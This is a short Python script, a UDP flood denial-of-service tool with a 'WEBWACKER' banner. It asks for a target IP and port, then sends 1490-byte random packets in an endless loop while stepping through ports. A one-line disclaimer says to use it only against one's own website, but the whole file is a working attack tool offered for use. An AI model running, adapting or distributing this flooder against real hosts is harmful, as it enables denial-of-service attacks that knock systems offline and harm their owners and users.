import sys
import os
import time
import socket
import random
from datetime import datetime

# Code Time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Socket setup
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1490)

# Windows compatible clear screen
os.system("cls" if os.name == "nt" else "clear")

print("""
██╗    ██╗███████╗██████╗ ██╗    ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██║    ██║██╔════╝██╔══██╗██║    ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║ █╗ ██║█████╗  ██████╔╝██║ █╗ ██║███████║██║     █████╔╝ █████╗  ██████╔╝
██║███╗██║██╔══╝  ██╔══██╗██║███╗██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚███╔███╔╝███████╗██████╔╝╚███╔███╔╝██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
 ╚══╝╚══╝ ╚══════╝╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
""")
print("Created by Fatal. Use this ONLY for educational purpose only AGAINST your own website.")

ip = input("IP Target : ")
port = int(input("Port      : "))

# Clear screen again for Windows
os.system("cls" if os.name == "nt" else "clear")

print("Attacking...")

time.sleep(2)

sent = 0
try:
    while True:
        sock.sendto(bytes_data, (ip, port))
        sent += 1
        port += 1
        print(f"Sent {sent} packets to {ip} through port: {port}")
        
        if port >= 65534:
            port = 1

            
except KeyboardInterrupt:
    print("\n[!] Attack stopped by user")
    print(f"[+] Total packets sent: {sent}")
except socket.error as e:
    print(f"\n[!] Socket error: {e}")
except Exception as e:
    print(f"\n[!] Error occurred: {e}")
finally:
    sock.close()
